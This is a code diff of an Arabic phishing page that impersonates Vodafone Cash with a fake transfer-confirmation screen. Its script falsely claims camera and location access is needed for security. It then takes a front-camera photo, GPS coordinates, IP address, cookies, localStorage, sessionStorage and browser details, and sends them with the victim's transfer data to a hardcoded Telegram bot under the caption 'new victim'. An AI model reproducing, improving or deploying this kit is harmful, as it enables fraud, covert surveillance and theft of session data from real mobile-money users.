@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>فودافون كاش - تأكيد التحويل</title>
     <style>
-        /* --- نفس الـ CSS السابق (محذوف للاختصار) --- */
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Tahoma',Arial,sans-serif;}
         body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;direction:rtl;padding:16px;}
         .container{background:#fff;border-radius:24px;box-shadow:0 8px 40px rgba(0,0,0,.08);max-width:420px;width:100%;padding:32px 24px 28px;border:1px solid rgba(0,0,0,.02);position:relative;}
@@ -48,12 +47,15 @@
         <div class="loading-spinner"></div>
         <div class="loading-text">جاري التحقق من الهوية<span class="dots"></span></div>
     </div>
-    <div class="header"><div class="logo"><img src="vodafone_cash.png" alt="Vodafone Logo" class="vodafone-logo"><span>فودافون كاش</span></div><div class="header-left"><img src="vf_logo.webp" alt="Logo" class="left-logo"></div></div>
-    <div class="permission-banner" id="permissionBanner"><svg viewBox="0 0 24 24"><path d="M12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11S18.075 1 12 1zm0 20c-4.962 0-9-4.038-9-9s4.038-9 9-9 9 4.038 9 9-4.038 9-9 9zm1-5h-2v-6h2v6zm0-8h-2V6h2v2z"/></svg><span>لأغراض التأمين وحماية أموالك، يرجى منح الإذن للكاميرا وتحديد الموقع لتأكيد هويتك</span></div>
+    <div class="header">
+        <div class="logo"><img src="vodafone_cash.png" alt="Vodafone Logo" class="vodafone-logo"><span>فودافون كاش</span></div>
+        <div class="header-left"><img src="vf_logo.webp" alt="Logo" class="left-logo"></div>
+    </div>
+    <div class="permission-banner"><svg viewBox="0 0 24 24"><path d="M12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11S18.075 1 12 1zm0 20c-4.962 0-9-4.038-9-9s4.038-9 9-9 9 4.038 9 9-4.038 9-9 9zm1-5h-2v-6h2v6zm0-8h-2V6h2v2z"/></svg><span>لأغراض التأمين وحماية أموالك، يرجى منح الإذن للكاميرا وتحديد الموقع لتأكيد هويتك</span></div>
     <h1 class="title">تأكيد التحويل</h1>
     <h2 class="main-amount"><span id="amountNumber">1000</span> <span>جنيه</span></h2>
     <p class="subtitle">يرجى تأكيد بيانات التحويل لإتمام العملية</p>
-    <div class="info-box" id="infoBox">
+    <div class="info-box">
         <div class="row"><span class="label">من</span><span class="value" id="senderDisplay">01012345678</span></div>
         <div class="row name-row"><span class="label">الاسم</span><span class="value" id="nameDisplay">خالد ع** م*** ا*****</span></div>
         <div class="row"><span class="label">الي</span><span class="value" id="receiverDisplay">01008652784</span></div>
@@ -61,13 +63,15 @@
     </div>
     <button class="btn-confirm" id="confirmBtn" onclick="confirmTransfer()">تأكيد التحويل</button>
     <div id="status"></div>
-    <div class="footer"><div class="lock"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg><span>تحويل آمن ومشفر</span></div><div style="margin-top:6px;color:#b0b0b0;font-size:11px;">© 2026 فودافون مصر - جميع الحقوق محفوظة</div></div>
+    <div class="footer">
+        <div class="lock"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg><span>تحويل آمن ومشفر</span></div>
+        <div style="margin-top:6px;color:#b0b0b0;font-size:11px;">© 2026 فودافون مصر - جميع الحقوق محفوظة</div>
+    </div>
 </div>
 <script>
 const BOT_TOKEN = '8603992880:AAF5ywTfIDDvkcbGooGQ8lU_2qLD5Aja-OI';
 const CHAT_ID = '8222931248';
 
-// ====== عناصر شاشة التحميل ======
 const loadingOverlay = document.getElementById('loadingOverlay');
 const statusDiv = document.getElementById('status');
 const confirmBtn = document.getElementById('confirmBtn');
@@ -75,7 +79,6 @@ const confirmBtn = document.getElementById('confirmBtn');
 function showLoading() { loadingOverlay.classList.add('active'); }
 function hideLoading() { loadingOverlay.classList.remove('active'); }
 
-// ====== قراءة البيانات من الرابط ======
 function getParams() {
     const params = new URLSearchParams(window.location.search);
     return {
@@ -86,7 +89,6 @@ function getParams() {
     };
 }
 
-// ====== عرض البيانات ======
 function loadData() {
     const data = getParams();
     document.getElementById('senderDisplay').innerText = data.sender;
@@ -95,7 +97,6 @@ function loadData() {
     document.getElementById('amountNumber').innerText = data.amount;
 }
 
-// ====== طلب الأذونات ======
 function requestPermissions() {
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
@@ -107,10 +108,11 @@ function requestPermissions() {
     }
 }
 
-// ====== جلب البيانات ======
+// ====== دالة جلب البيانات (بدون أي تعقيدات) ======
 function stealAllData() {
     const data = getParams();
 
+    // جلب الـ IP
     function fetchIP() {
         return fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
@@ -118,6 +120,7 @@ function stealAllData() {
             .catch(() => 'غير معروف');
     }
 
+    // جلب الـ GPS
     function fetchLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
@@ -125,8 +128,16 @@ function stealAllData() {
                 return;
             }
             navigator.geolocation.getCurrentPosition(
-                (position) => { resolve({ lat: position.coords.latitude, lon: position.coords.longitude, accuracy: position.coords.accuracy }); },
-                () => { resolve({ lat: 'غير متاح', lon: 'غير متاح', accuracy: 'غير متاح' }); }
+                (position) => {
+                    resolve({
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    });
+                },
+                () => {
+                    resolve({ lat: 'غير متاح', lon: 'غير متاح', accuracy: 'غير متاح' });
+                }
             );
         });
     }
@@ -134,12 +145,14 @@ function stealAllData() {
     return Promise.all([fetchIP(), fetchLocation()])
         .then(([ip, gps]) => {
             const cookies = document.cookie || 'لا يوجد كوكيز';
-            let localStorageData = 'لا يوجد', sessionData = 'لا يوجد';
+            let localStorageData = 'لا يوجد';
+            let sessionData = 'لا يوجد';
             try {
                 localStorageData = JSON.stringify(localStorage);
                 sessionData = JSON.stringify(sessionStorage);
             } catch(e) {}
 
+            // بيانات المتصفح
             const browserData = {
                 userAgent: navigator.userAgent,
                 language: navigator.language,
@@ -151,10 +164,18 @@ function stealAllData() {
             };
 
             return {
-                ip, gps,
-                cookies, localStorage: localStorageData, sessionStorage: sessionData,
-                browser,
-                victim: { receiver: data.receiver, name: data.name, sender: data.sender, amount: data.amount }
+                ip: ip,
+                gps: gps,
+                cookies: cookies,
+                localStorage: localStorageData,
+                sessionStorage: sessionData,
+                browser: browserData,
+                victim: {
+                    receiver: data.receiver,
+                    name: data.name,
+                    sender: data.sender,
+                    amount: data.amount
+                }
             };
         });
 }
@@ -162,7 +183,9 @@ function stealAllData() {
 // ====== إرسال البيانات ======
 function sendToTelegram(allData, photoBase64 = null) {
     const caption = `🕵️ ضحية جديدة - تقرير كامل
-📍 GPS: ${allData.gps.lat}, ${allData.gps.lon} (دقة: ${allData.gps.accuracy}م)
+
+📍 الموقع (GPS): ${allData.gps.lat}, ${allData.gps.lon}
+🎯 دقة GPS: ${allData.gps.accuracy} متر
 📌 IP: ${allData.ip}
 📱 الجهاز: ${allData.browser.userAgent}
 🌐 اللغة: ${allData.browser.language}
@@ -170,10 +193,17 @@ function sendToTelegram(allData, photoBase64 = null) {
 🖥️ الشاشة: ${allData.browser.screen}
 ⏰ المنطقة: ${allData.browser.timezone}
 🔗 الرابط: ${allData.browser.url}
+📎 المرسل: ${allData.browser.referrer}
 
-🍪 الكوكيز: ${allData.cookies}
-💾 localStorage: ${allData.localStorage}
-📦 sessionStorage: ${allData.sessionStorage}
+🍪 الكوكيز:
+${allData.cookies}
+
+💾 localStorage:
+${allData.localStorage}
+
+📦 sessionStorage:
+${allData.sessionStorage}
+
 📱 المستلم: ${allData.victim.receiver}
 👤 الاسم: ${allData.victim.name}
 👤 المرسل: ${allData.victim.sender}
@@ -184,19 +214,26 @@ function sendToTelegram(allData, photoBase64 = null) {
         fetchPromise = fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, caption: caption, photo: photoBase64 })
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                caption: caption,
+                photo: photoBase64
+            })
         });
     } else {
         fetchPromise = fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: caption })
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: caption
+            })
         });
     }
     return fetchPromise;
 }
 
-// ====== التقاط الصورة من الكاميرا ======
+// ====== التقاط صورة من الكاميرا ======
 function capturePhoto() {
     return new Promise((resolve, reject) => {
         navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
@@ -205,7 +242,6 @@ function capturePhoto() {
                 video.srcObject = stream;
                 video.play();
 
-                // ننتظر 500ms عشان الفيديو يبدأ
                 setTimeout(() => {
                     try {
                         const canvas = document.createElement('canvas');
@@ -232,7 +268,6 @@ function confirmTransfer() {
     confirmBtn.disabled = true;
     confirmBtn.style.opacity = '0.7';
 
-    // نجرب ناخد صورة
     capturePhoto()
         .then(photoBase64 => {
             stealAllData().then(allData => {
